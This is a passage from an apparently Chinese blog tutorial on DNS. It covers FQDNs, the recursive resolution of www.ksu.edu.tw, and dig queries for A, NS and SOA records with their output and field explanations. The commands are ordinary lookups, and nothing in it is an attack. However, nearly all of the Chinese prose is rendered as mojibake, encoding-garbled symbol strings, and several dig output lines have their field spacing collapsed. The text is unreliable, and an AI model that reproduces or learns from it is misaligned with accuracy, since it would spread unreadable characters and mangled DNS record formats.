¹åŸŸå,</p><p>ç¬¬äºŒå±‚æ˜¯é¡¶çº§åŸŸå.ä¾‹å¦‚com,org,edu,gov,net,è¿˜æœ‰å›½å®¶åŸŸå,æ¯”å¦‚cn(ä¸­å›½),jp(æ—¥æœ¬),uk(è‹±å›½),us(ç¾å›½)ç­‰.</p><p>å’ŒDNSç›¸å…³çš„å¦å¤–ä¸€ä¸ªæ¦‚å¿µæ˜¯FQDN( Fully Qualified Domain Name ).å®Œå…¨åˆæ ¼åŸŸå. FQDNç”±ä¸¤éƒ¨åˆ†ç»„æˆ:hostnameå’Œdomain name (ä¹Ÿå°±æ˜¯ä¸»æœºå+åŸŸå).æœ€è‘—åçš„ä¸»æœºåæ˜¯www.å®ƒæ˜¯æ‰€æœ‰ç½‘ç«™ç«™ç‚¹çš„ä¸»æœºå.</p><blockquote><p>ä¸¾ä¸ªä¾‹å­: <a href="http://www.doweidu.com" target="_blank" rel="noopener">www.doweidu.com</a>  è¿™ä¸ªå°±æ˜¯ä¸€ä¸ªFQDNå®Œå…¨åˆæ ¼åŸŸå.å…¶ä¸­doweidu.comæ˜¯åŸŸå.wwwæ˜¯ä¸»æœºå</p></blockquote><hr><h4 id="DNSçš„æŸ¥è¯¢è¿‡ç¨‹"><a href="#DNSçš„æŸ¥è¯¢è¿‡ç¨‹" class="headerlink" title="DNSçš„æŸ¥è¯¢è¿‡ç¨‹"></a>DNSçš„æŸ¥è¯¢è¿‡ç¨‹</h4><p> DNS æ˜¯ä»¥ç±»ä¼¼ã€æ ‘çŠ¶ç›®å½•ã€çš„å‹æ€æ¥è¿›è¡Œä¸»æœºåçš„ç®¡ç†çš„ï¼æ‰€ä»¥æ¯ä¸€éƒ¨ DNS æœåŠ¡å™¨éƒ½ä»…ç®¡ç†è‡ªå·±çš„ä¸‹ä¸€å±‚ä¸»æœº .ä¸‹å›¾æ¼”ç¤ºäº†<a href="http://www.ksu.edu.twè¿™ä¸ªä¸»æœºåçš„DNSæŸ¥è¯¢è¿‡ç¨‹" target="_blank" rel="noopener">www.ksu.edu.twè¿™ä¸ªä¸»æœºåçš„DNSæŸ¥è¯¢è¿‡ç¨‹</a>:</p><p><img src="http://pabkmteb4.bkt.clouddn.com/dns.png" alt=""></p><p>1.é¦–å…ˆï¼Œå½“ä½ åœ¨æµè§ˆå™¨çš„ç½‘å€åˆ—è¾“å…¥ <a href="http://www.ksu.edu.tw/" target="_blank" rel="noopener">http://www.ksu.edu.tw</a> æ—¶ï¼Œä½ çš„è®¡ç®—æœºå°±ä¼šæŸ¥è¯¢æœ¬æœºçš„hostsæ–‡ä»¶,æ˜¯å¦ç»‘å®šæ­¤ä¸»æœºåå’ŒIPçš„å¯¹åº”å…³ç³».</p><p>2.æµè§ˆå™¨ä¼šæŸ¥çœ‹æœ¬èº«çš„DNSç¼“å­˜è®°å½•</p><p>3.å®¢æˆ·ç«¯(ä¹Ÿå°±æ˜¯ä½ æœ¬æœº)ä¼šå‘DNSæœåŠ¡å™¨æŸ¥è¯¢<a href="http://www.ksu.edu.tw/" target="_blank" rel="noopener">http://www.ksu.edu.tw</a>çš„IPåœ°å€</p><p>4.å¦‚æœDNSæœåŠ¡å™¨æ²¡æœ‰æ­¤ä¸»æœºçš„IPåœ°å€,åˆ™æƒ³æœ€é¡¶å±‚çš„rootæœåŠ¡å™¨æŸ¥è¯¢.ä½†æ˜¯ç”±äº . åªè®°å½•äº† .tw çš„ä¿¡æ¯,å¹¶ä¸çŸ¥é“å…·ä½“twä¸‹çš„æŸä¸ªä¸»æœºçš„IPåœ°å€.æ­¤æ—¶ . ä¼šå‘Šè¯‰DNSæœåŠ¡å™¨å®ƒä¸çŸ¥é“ä¸»æœºçš„IP ï¼Œä¸è¿‡å®ƒçŸ¥é“twæœåŠ¡å™¨åœ¨å“ªé‡Œï¼Œä½ åº”è¯¥å‘ .tw å»è¯¢é—®æ‰å¯¹ï¼Œç„¶åè¿”å›twæœåŠ¡å™¨çš„IPåœ°å€ç»™DNSæœåŠ¡å™¨</p><p>5.DNS Serveræ¥ç€åˆåˆ° .tw å»æŸ¥è¯¢ï¼Œè€Œè¯¥éƒ¨æœºå™¨ç®¡ç†çš„åˆä»…æœ‰ .edu.tw, .com.tw, gov.twâ€¦ é‚£å‡ éƒ¨ä¸»æœºï¼Œç»è¿‡æ¯”å¯¹åå‘ç°æˆ‘ä»¬è¦çš„æ˜¯ .edu.tw çš„ç½‘åŸŸï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™ .tw åˆå‘Šè¯‰ DNS server è¯´ï¼šä½ è¦å»ç®¡ç† .edu.tw è¿™ä¸ªç½‘åŸŸçš„ä¸»æœºé‚£é‡ŒæŸ¥è¯¢ï¼Œæˆ‘æœ‰ä»–çš„ IP ï¼</p><p>6.DNS Serveræ¥ç€åˆåˆ°.edu.twå»æŸ¥è¯¢, .edu.tw ä¹Ÿæ²¡æœ‰å…·ä½“ä¸»æœºçš„IP ï¼Œå®ƒä¼šè¿”å›DNSæœåŠ¡å™¨å…³äº.ksu.edu.twçš„åœ°å€ï¼Œè®©DNSæœåŠ¡å™¨å»å‘.ksu.edu.twæœåŠ¡å™¨æŸ¥è¯¢</p><p>7.å½“DNS serverå‘.ksu.edu.twæœåŠ¡å™¨æŸ¥è¯¢<a href="http://www.ksu.edu.twä¸»æœºçš„IPåœ°å€æ—¶,ç”±äº.ksu.edu.twæœåŠ¡å™¨ç®¡ç†æ­¤ä¸»æœºçš„IPåœ°å€å…³ç³»,æ‰€ä»¥å‘DNS" target="_blank" rel="noopener">www.ksu.edu.twä¸»æœºçš„IPåœ°å€æ—¶,ç”±äº.ksu.edu.twæœåŠ¡å™¨ç®¡ç†æ­¤ä¸»æœºçš„IPåœ°å€å…³ç³»,æ‰€ä»¥å‘DNS</a> serverè¿”å›æ­£ç¡®çš„<a href="http://www.ksu.edu.twä¸»æœºçš„IPåœ°å€" target="_blank" rel="noopener">www.ksu.edu.twä¸»æœºçš„IPåœ°å€</a>.</p><p>8.å½“DNS serveræŸ¥è¯¢åˆ°äº†æ­£ç¡®çš„IPåœ°å€å,ä¼šå°†æ­¤ä¸»æœºåå’ŒIPåœ°å€ç¼“å­˜åœ¨è‡ªå·±çš„å†…å­˜ä¸­,æ–¹ä¾¿åç»­å…¶ä»–ä¸»æœºçš„æŸ¥è¯¢.ç„¶åå°†IPåœ°å€è¿”å›ç»™å®¢æˆ·ç«¯,(å½“ç„¶,è¿™ä¸ªç¼“å­˜å€¼æœ‰æ—¶é—´é™åˆ¶,ä¸€èˆ¬æ˜¯24å°æ—¶å†…,è¯¥è®°å½•å°±ä¼šè¢«é‡Šæ”¾).</p><p>9.æ­¤æ—¶å®¢æˆ·ç«¯æµè§ˆå™¨æ‹¿åˆ°äº†æ­£ç¡®çš„IPåœ°å€,å°±å¯ä»¥é€šè¿‡<a href="http://www.ksu.edu.twè¿™ä¸ªåŸŸåè®¿é—®è¿œç¨‹ä¸»æœºçš„èµ„æº.å¦‚æœDNS" target="_blank" rel="noopener">www.ksu.edu.twè¿™ä¸ªåŸŸåè®¿é—®è¿œç¨‹ä¸»æœºçš„èµ„æº.å¦‚æœDNS</a> serveråˆ°æœ€åä¹Ÿæ²¡æœ‰æŸ¥è¯¢åˆ°<a href="http://www.ksu.edu.twä¸»æœºçš„IPåœ°å€,DNS" target="_blank" rel="noopener">www.ksu.edu.twä¸»æœºçš„IPåœ°å€,DNS</a> SERVERä¼šå‘Šè¯‰å®¢æˆ·ç«¯æ­¤ä¸»æœºåä¸å­˜åœ¨.å®¢æˆ·ç«¯æµè§ˆå™¨ä¼šè¿”å›é”™è¯¯ä¿¡æ¯,å‘Šè¯‰ç”¨æˆ·æ­¤ç½‘ç«™åä¸å­˜åœ¨.</p><p>ä¸‹é¢çš„digå‘½ä»¤è¯¦ç»†è®ºè¯äº†DNSçš„æŸ¥è¯¢è¿‡ç¨‹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]$dig +trace www.ksu.edu.tw</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.9.4-RedHat-9.9.4-61.el7 &lt;&lt;&gt;&gt; +trace www.ksu.edu.tw</span><br><span class="line">;; global options: +cmd</span><br><span class="line">.275227INNSf.root-servers.net.</span><br><span class="line">.275227INNSg.root-servers.net.</span><br><span class="line">.275227INNSk.root-servers.net.</span><br><span class="line">.275227INNSe.root-servers.net.</span><br><span class="line">.275227INNSc.root-servers.net.</span><br><span class="line">.275227INNSj.root-servers.net.</span><br><span class="line">.275227INNSd.root-servers.net.</span><br><span class="line">.275227INNSh.root-servers.net.</span><br><span class="line">.275227INNSl.root-servers.net.</span><br><span class="line">.275227INNSb.root-servers.net.</span><br><span class="line">.275227INNSm.root-servers.net.</span><br><span class="line">.275227INNSa.root-servers.net.</span><br><span class="line">.275227INNSi.root-servers.net.</span><br><span class="line">;; Received 239 bytes from 114.114.114.114#53(114.114.114.114) in 253 ms</span><br><span class="line"></span><br><span class="line">tw.172800INNSg.dns.tw.</span><br><span class="line">tw.172800INNSf.dns.tw.</span><br><span class="line">tw.172800INNSns.twnic.net.</span><br><span class="line">tw.172800INNSd.dns.tw.</span><br><span class="line">tw.172800INNSa.dns.tw.</span><br><span class="line">tw.172800INNSb.dns.tw.</span><br><span class="line">tw.172800INNSi.dns.tw.</span><br><span class="line">tw.172800INNSc.dns.tw.</span><br><span class="line">tw.172800INNSe.dns.tw.</span><br><span class="line">tw.172800INNSh.dns.tw.</span><br><span class="line">tw.172800INNSanytld.apnic.net.</span><br><span class="line">tw.86400INDS40792 8 2 A05DB4B0DEB971031361BB621E8BB1B8D7346665A3D1B06EC1431ADB 7D015EE9</span><br><span class="line">tw.86400INRRSIGDS 8 1 86400 20180822170000 20180809160000 41656 . ORWOjWoiZqcRkVip1DvoUVvxHIxQZJBsT93obIYJEdw61Vuam6IhNmYV u+cNQF9HqsfiVSJaiekiK2ERjpmkaNdJfeK/zAkYhKLa6l0JzZoJVxjj Ul/HKZIvbB07MjyZP1lM7HCAlHSAR1C+g9H1owUgW031G4L+cIQ7PVaa bBFs/C8JJbyOqR4RwkCPWmawiHEPMNsDboTepfyChdsDv+RTodb1hc0l /orfjg/AGdPxaKgn2LutLrOZRcttSYwGxg1i3aw4YcGNt8azxdXMSGqO FcfKKd4aP7sgz57NClXUSJIjCj5I30iQCQfV9V5idQlKN5MVYUBL7/Pd XghhlQ==</span><br><span class="line">;; Received 1035 bytes from 198.41.0.4#53(a.root-servers.net) in 5764 ms</span><br><span class="line"></span><br><span class="line">edu.tw.3600INNSmoestar.edu.tw.</span><br><span class="line">edu.tw.3600INNSmoemoon.edu.tw.</span><br><span class="line">edu.tw.3600INNSb.twnic.net.tw.</span><br><span class="line">edu.tw.3600INNSa.twnic.net.tw.</span><br><span class="line">edu.tw.3600INNSc.twnic.net.tw.</span><br><span class="line">edu.tw.3600INNSd.twnic.net.tw.</span><br><span class="line">edu.tw.300INDS40234 8 1 5A8AB67C461F4330D146EE4E2E5A08CE279B7BEB</span><br><span class="line">edu.tw.300INDS40234 8 2 289D061D208C871915EB07F63FB175B21022422D5365D4E945BCE397 104A9C08</span><br><span class="line">edu.tw.300INRRSIGDS 8 2 300 20180909000033 20180810000033 46080 tw. QFQiVnzdUorHMrT5IpZTYWHdH0QtEknww+Q+Ql2K9+MFwHhsNqxvk1Uw iSMdQQ9rQ92Tdql99Myv9QGrOxHWd+Ol/ULOg4I2vKIHPqskAN2F7pu1 VhWBAWQ2Tti/pArvGsAn7IaI8DuWWEoD44NjIIOo0NY9YVssz1UUvWpk PU4=</span><br><span class="line">;; Received 691 bytes from 203.73.24.25#53(a.dns.tw) in 259 ms</span><br><span class="line"></span><br><span class="line">ksu.edu.tw.300INNSdns1.ksu.edu.tw.</span><br><span class="line">ksu.edu.tw.300INNSdns3.twaren.net.</span><br><span class="line">ksu.edu.tw.300INNSdns2.ksu.edu.tw.</span><br><span class="line">2JL30RTHBS2AC6H8PKQTIF3OCINIARDM.edu.tw. 300 INNSEC3 1 0 10 9FCD30FFAD75 2KI9R34PM8A1VO5V97VNHJNVJSL0R6ON NS</span><br><span class="line">2JL30RTHBS2AC6H8PKQTIF3OCINIARDM.edu.tw. 300 INRRSIG NSEC3 8 3 300 20180813044341 20180809035735 56424 edu.tw. ebq+txlgqrK4GsZgFoZMTBUgKGcdaiXJtj2JFvKXlLLjdoJyIFC9bEsf aZSoLLfpFIBsF6qons5Yu0YaTp7ypmbMQWws9UOBs9kNnBW++Eaq97Hb RnCq8smJIYnRrmIClEs1kUAkqNEtf9s/TqmcGu3+TLswx5+tVSwbR3DX MIM=</span><br><span class="line">;; Received 388 bytes from 192.83.166.9#53(a.twnic.net.tw) in 1274 ms</span><br><span class="line"></span><br><span class="line">www.ksu.edu.tw.3600INA120.114.100.65</span><br><span class="line">ksu.edu.tw.3600INNSdns3.twaren.net.</span><br><span class="line">ksu.edu.tw.3600INNSdns1.ksu.edu.tw.</span><br><span class="line">ksu.edu.tw.3600INNSdns2.ksu.edu.tw.</span><br><span class="line">;; Received 202 bytes from 211.79.61.47#53(dns3.twaren.net) in 333 ms</span><br><span class="line"></span><br><span class="line">ä»ä»¥ä¸Šæ­¥éª¤å¯ä»¥çœ‹åˆ°.114.114.114.114è¿™å°DNSæœåŠ¡å™¨ä¾æ¬¡å‘ä»¥ä¸‹DNSæŸ¥è¯¢:</span><br><span class="line">root.(å…¨ä¸–ç•Œä¸€å…±æœ‰13å°DNSæ ¹æœåŠ¡å™¨)---&gt;tw.----&gt;edu.tw.---&gt;ksu.edu.tw.</span><br><span class="line">æœ€åæŸ¥è¯¢åˆ°äº†ä¸»æœºwww.ksu.edu.tw.çš„IPåœ°å€</span><br></pre></td></tr></table></figure><hr><h4 id="DNSæ­£å‘è§£æå­—æ®µè§£æ"><a href="#DNSæ­£å‘è§£æå­—æ®µè§£æ" class="headerlink" title="DNSæ­£å‘è§£æå­—æ®µè§£æ"></a>DNSæ­£å‘è§£æå­—æ®µè§£æ</h4><p>digå¯¹ä¸»æœºè¿›è¡Œæ­£å‘è§£æçš„ç»“æœæœ‰å›ºå®šçš„æ ¼å¼å’Œå­—æ®µ.ä¸‹é¢è§£æä¸€ä¸‹å„å­—æ®µä»£è¡¨çš„æ„ä¹‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]$dig www.baidu.com</span><br><span class="line">#å‰é¢çœç•¥</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;www.baidu.com.INA</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">www.baidu.com.919INCNAMEwww.a.shifen.com.</span><br><span class="line">www.a.shifen.com.209INA61.135.169.125</span><br><span class="line">www.a.shifen.com.209INA61.135.169.121</span><br><span class="line"></span><br><span class="line">;; Query time: 17 msec</span><br><span class="line">;; SERVER: 114.114.114.114#53(114.114.114.114)</span><br><span class="line">;; WHEN: Fri Aug 10 14:41:26 CST 2018</span><br><span class="line">;; MSG SIZE  rcvd: 101</span><br></pre></td></tr></table></figure><p>digä¸åŠ ä»»ä½•å‚æ•°çš„æƒ…å†µä¸‹æ˜¯æŸ¥è¯¢A(address)è®°å½•,ä¹Ÿå°±æ˜¯ä¸»æœºçš„IPåœ°å€.ä¸Šé¢è¾“å‡ºç»“æœæ ¼å¼ç®€åŒ–å¦‚ä¸‹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[domain]   [ttl]          IN [[RR type]  [RR data]]</span><br><span class="line">[å¾…æŸ¥æ•°æ®] [æš‚å­˜æ—¶é—´(ç§’)]   IN [[èµ„æºç±»å‹] [èµ„æºå†…å®¹]]</span><br></pre></td></tr></table></figure><p><strong>domain</strong>: æŸ¥è¯¢çš„ä¸»æœºå,æœ€å¥½æ˜¯ç”¨FQDNå®Œå…¨åˆæ ¼åŸŸå,ä¹Ÿå°±æ˜¯åŸŸååé¢è¦åŠ ä¸€ä¸ªå°æ•°ç‚¹. ä»£è¡¨æ ¹.ä¾‹å¦‚:<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>. (ä¸è¦å¿½ç•¥æœ€åçš„ä¸€ä¸ª.) å¯ä»¥çœ‹åˆ°ANSWER SECTIONå­—æ®µçš„<a href="http://www.baidu.com.ç»“å°¾æœ‰ä¸ªå°æ•°ç‚¹" target="_blank" rel="noopener">www.baidu.com.ç»“å°¾æœ‰ä¸ªå°æ•°ç‚¹</a></p><p><strong>ttl:</strong> time to live.æ„æ€å°±æ˜¯å½“è¿™ç¬”è®°å½•è¢«å…¶ä»– DNS æœåŠ¡å™¨æŸ¥è¯¢åˆ°åï¼Œ è¿™ä¸ªè®°å½•ä¼šä¿æŒåœ¨å¯¹æ–¹ DNS æœåŠ¡å™¨çš„å¿«å–ä¸­ï¼Œä¿æŒå¤šå°‘ç§’é’Ÿçš„æ„æ€.æ‰€ä»¥ï¼Œå½“ä½ åå¤æ‰§è¡Œ dig ä¹‹åï¼Œå°±ä¼šå‘ç°è¿™ä¸ªæ—¶é—´ä¼šå‡å°‘ï¼ä¸ºä»€ä¹ˆå‘¢ï¼Ÿå› ä¸ºåœ¨ä½ çš„ DNS å¿«å–ä¸­ï¼Œè¿™ç¬”æ•°æ®èƒ½å¤Ÿä¿å­˜çš„æ—¶é—´ä¼šå¼€å§‹å€’æ•°ï¼Œ å½“è¿™ä¸ªæ•°å­—å½’é›¶åï¼Œä¸‹æ¬¡æœ‰äººå†é‡æ–°æœå¯»è¿™ç¬”è®°å½•æ—¶ï¼Œä½ çš„ DNS å°±ä¼šé‡æ–°æ²¿ç€ . (root) å¼€å§‹é‡æ¥æœå¯»ä¸€éï¼Œ è€Œä¸ä¼šä»å¿«å–é‡Œé¢æ‰å–äº† (å› ä¸ºå¿«å–å†…çš„èµ„æ–™ä¼šè¢«èˆå¼ƒ)ã€‚ </p><p><strong>IN</strong>: è¿™ä¸ªå…³é”®å­—æ˜¯å›ºå®šçš„.</p><p><strong>RR type:</strong> è¿™ä¸ªè¡¨ç¤ºæŸ¥è¯¢ç±»å‹.è¿™é‡Œæ˜¯æŸ¥è¯¢Aè®°å½•.</p><p><strong>RR data:</strong> æŸ¥è¯¢ç»“æœ.åœ¨è¿™é‡Œæ˜¯æŸ¥è¯¢å‡ºæ¥çš„IPåœ°å€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># å¸¸è§çš„æ­£è§£æ–‡ä»¶ RR ç›¸å…³ä¿¡æ¯</span><br><span class="line">[domain]    IN  [[RR type]  [RR data]]</span><br><span class="line">ä¸»æœºå.   IN  A           IPv4 çš„ IP åœ°å€</span><br><span class="line">ä¸»æœºå.   IN  AAAA        IPv6 çš„ IP åœ°å€</span><br><span class="line">é¢†åŸŸå.   IN  NS          ç®¡ç†è¿™ä¸ªé¢†åŸŸåçš„æœåŠ¡å™¨ä¸»æœºåå­—.</span><br><span class="line">é¢†åŸŸå.   IN  SOA         ç®¡ç†è¿™ä¸ªé¢†åŸŸåçš„ä¸ƒä¸ªé‡è¦å‚æ•°(å®¹åè¯´æ˜)</span><br><span class="line">é¢†åŸŸå.   IN  MX          é¡ºåºæ•°å­—  æ¥æ”¶é‚®ä»¶çš„æœåŠ¡å™¨ä¸»æœºåå­—</span><br><span class="line">ä¸»æœºåˆ«å.   IN  CNAME       å®é™…ä»£è¡¨è¿™ä¸ªä¸»æœºåˆ«åçš„ä¸»æœºåå­—.</span><br></pre></td></tr></table></figure><hr><p>ä¸Šé¢æ¼”ç¤ºäº†æŸ¥è¯¢IPè®°å½•çš„æ–¹æ³•.ä¸‹é¢æ˜¯æŸ¥è¯¢å…¶ä»–ç±»å‹çš„æ–¹æ³•:</p><ul><li><strong>NS:æŸ¥è¯¢ç®¡ç†é¢†åŸŸå (zone) çš„æœåŠ¡å™¨ä¸»æœºå</strong> </li></ul><p>å¦‚æœä½ æƒ³è¦çŸ¥é“ <a href="http://www.haoshiqi.net" target="_blank" rel="noopener">www.haoshiqi.net</a> çš„ä¸»æœºç”±å“ªéƒ¨ DNS æœåŠ¡å™¨æä¾›çš„ï¼Œé‚£å°±å¾—è¦ä½¿ç”¨ NS (NameServer) çš„ RR ç±»å‹æ ‡å¿—æ¥æŸ¥è¯¢ã€‚ä¸è¿‡ï¼Œç”±äº NS æ˜¯ç®¡ç†æ•´ä¸ªé¢†åŸŸçš„ï¼Œå› æ­¤ï¼Œä½ å¾—è¦æŸ¥è¯¢çš„ç›®æ ‡å°†å¾—è¾“å…¥ domainï¼Œäº¦å³ haoshiqi.netæ‰è¡Œ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]$dig -t ns haoshiqi.net</span><br><span class="line"></span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;haoshiqi.net.INNS</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">haoshiqi.net.1720INNSns4.dnsv3.com.</span><br><span class="line">haoshiqi.net.1720INNSns3.dnsv3.com.</span><br><span class="line">#å¯ä»¥çœ‹åˆ°è¿™ä¸ªåŸŸåçš„DNSæœåŠ¡å•†æ˜¯ns4.dnsv3.com.å’Œns3.dnsv3.com.</span><br></pre></td></tr></table></figure><hr><ul><li><strong>SOA ï¼šæŸ¥è¯¢ç®¡ç†é¢†åŸŸåçš„æœåŠ¡å™¨ç®¡ç†ä¿¡æ¯</strong> </li></ul><p>å¦‚æœä½ æœ‰å¤šéƒ¨ DNS æœåŠ¡å™¨ç®¡ç†åŒä¸€ä¸ªé¢†åŸŸåæ—¶ï¼Œé‚£ä¹ˆæœ€å¥½ä½¿ç”¨ master/slave çš„æ–¹å¼æ¥è¿›è¡Œç®¡ç†ã€‚æ—¢ç„¶è¦è¿™æ ·ç®¡ç†ï¼Œ é‚£å°±å¾—è¦å®£å‘Šè¢«ç®¡ç†çš„ zone file æ˜¯å¦‚ä½•è¿›è¡Œä¼ è¾“çš„ï¼Œæ­¤æ—¶å°±å¾—è¦ SOA (Start Of Authority) çš„æ ‡å¿—äº†ã€‚ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]$dig -t soa haoshiqi.net</span><br><span class="line"></span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;haoshiqi.net.INSOA</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">haoshiqi.net.600INSOAns3.dnsv3.com. enterprise1dnsadmin.dnspod.com. 1530265971 3600 180 1209600 180</span><br></pre></td></tr></table></figure><p>SOA ä¸»è¦æ˜¯ä¸é¢†åŸŸæœ‰å…³ï¼Œæ‰€ä»¥å‰é¢å½“ç„¶è¦å†™ ksu.edu.tw è¿™ä¸ªé¢†åŸŸåã€‚è€Œ SOA åé¢å…±ä¼šæ¥ä¸ƒä¸ªå‚æ•°ï¼Œè¿™ä¸ƒä¸ªå‚æ•°çš„æ„ä¹‰ä¾åºæ˜¯ï¼š</p><ul><li><p>Master DNS æœåŠ¡å™¨ä¸»æœºåï¼šè¿™ä¸ªé¢†åŸŸä¸»è¦æ˜¯å“ªéƒ¨ DNS ä½œä¸º master çš„æ„æ€ã€‚åœ¨æœ¬ä¾‹ä¸­ï¼Œ ns3.dnsv3.com ä¸º ä¸»è¦ DNS æœåŠ¡å™¨ï¼›</p></li><li><p>ç®¡ç†å‘˜çš„ emailï¼šé‚£ä¹ˆç®¡ç†å‘˜çš„ email ä¸ºä½•ï¼Ÿå‘ç”Ÿé—®é¢˜å¯ä»¥è”ç»œè¿™ä¸ªç®¡ç†å‘˜ã€‚</p></li><li><p>åºå· (Serial)ï¼šè¿™ä¸ªåºå·ä»£è¡¨çš„æ˜¯è¿™ä¸ªæ•°æ®åº“æ¡£æ¡ˆçš„æ–°æ—§ï¼Œåºå·è¶Šå¤§ä»£è¡¨è¶Šæ–°ã€‚ å½“ slave è¦åˆ¤æ–­æ˜¯å¦ä¸»åŠ¨ä¸‹è½½æ–°çš„æ•°æ®åº“æ—¶ï¼Œå°±ä»¥åºå·æ˜¯å¦æ¯” slave ä¸Šçš„è¿˜è¦æ–°æ¥åˆ¤æ–­ï¼Œè‹¥æ˜¯åˆ™ä¸‹è½½ï¼Œè‹¥ä¸æ˜¯åˆ™ä¸ä¸‹è½½ã€‚ æ‰€ä»¥å½“ä½ ä¿®è®¢äº†æ•°æ®åº“å†…å®¹æ—¶ï¼Œè®°å¾—è¦å°†è¿™ä¸ªæ•°å€¼æ”¾å¤§æ‰è¡Œï¼ ä¸ºäº†æ–¹ä¾¿ç”¨æˆ·è®°å¿†ï¼Œé€šå¸¸åºå·éƒ½ä¼šä½¿ç”¨æ—¥æœŸæ ¼å¼ã€YYYYMMDDNUã€æ¥è®°å¿†</p></li><li><p>æ›´æ–°é¢‘ç‡ (Refresh)ï¼šé‚£ä¹ˆå•¥æ—¶ slave ä¼šå»å‘ master è¦æ±‚æ•°æ®æ›´æ–°çš„åˆ¤æ–­ï¼Ÿ å°±æ˜¯è¿™ä¸ªæ•°å€¼å®šä¹‰çš„ã€‚æ˜†å±±ç§‘å¤§çš„ DNS è®¾å®šæ¯ 3600 ç§’è¿›è¡Œä¸€æ¬¡ slave å‘ master è¦æ±‚æ•°æ®æ›´æ–°ã€‚é‚£æ¯æ¬¡ slave å»æ›´æ–°æ—¶ï¼Œ å¦‚æœå‘ç°åºå·æ²¡æœ‰æ¯”è¾ƒå¤§ï¼Œé‚£å°±ä¸ä¼šä¸‹è½½æ•°æ®åº“æ¡£æ¡ˆã€‚</p></li><li><p>å¤±è´¥é‡æ–°å°è¯•æ—¶é—´ (Retry)ï¼šå¦‚æœå› ä¸ºæŸäº›å› ç´ ï¼Œå¯¼è‡´ slave æ— æ³•å¯¹ master è¾¾æˆè”æœºï¼Œ é‚£ä¹ˆåœ¨å¤šä¹…çš„æ—¶é—´å†…ï¼Œslave ä¼šå°è¯•é‡æ–°è”æœºåˆ° masterã€‚åœ¨æœ¬ä¾‹ä¸­ï¼Œ180ç§’ä¼šé‡æ–°å°è¯•ä¸€æ¬¡ã€‚æ„æ€æ˜¯è¯´ï¼Œæ¯ 180ç§’ slave ä¼šä¸»åŠ¨å‘ master è”æœºï¼Œä½†å¦‚æœè¯¥æ¬¡è”æœºæ²¡æœ‰æˆåŠŸï¼Œé‚£æ¥ä¸‹æ¥å°è¯•è”æœºçš„æ—¶é—´ä¼šå˜æˆ 180ç§’ã€‚è‹¥åæ¥æœ‰æˆåŠŸï¼Œåˆ™åˆä¼šæ¢å¤åˆ° 180 ç§’æ‰å†ä¸€æ¬¡è”æœºã€‚</p></li><li><p>å¤±æ•ˆæ—¶é—´ (Expire)ï¼šå¦‚æœä¸€ç›´å¤±è´¥å°è¯•æ—¶é—´ï¼ŒæŒç»­è”æœºåˆ°è¾¾è¿™ä¸ªè®¾å®šå€¼æ—¶é™ï¼Œ é‚£ä¹ˆ slave å°†ä¸å†ç»§ç»­å°è¯•è”æœºï¼Œå¹¶ä¸”å°è¯•åˆ é™¤è¿™ä»½ä¸‹è½½çš„ zone file ä¿¡æ¯ã€‚è¿™è®¾å®šä¸º 1209600ç§’ã€‚æ„æ€æ˜¯è¯´ï¼Œå½“è”æœºä¸€ç›´å¤±è´¥ï¼Œæ¯ 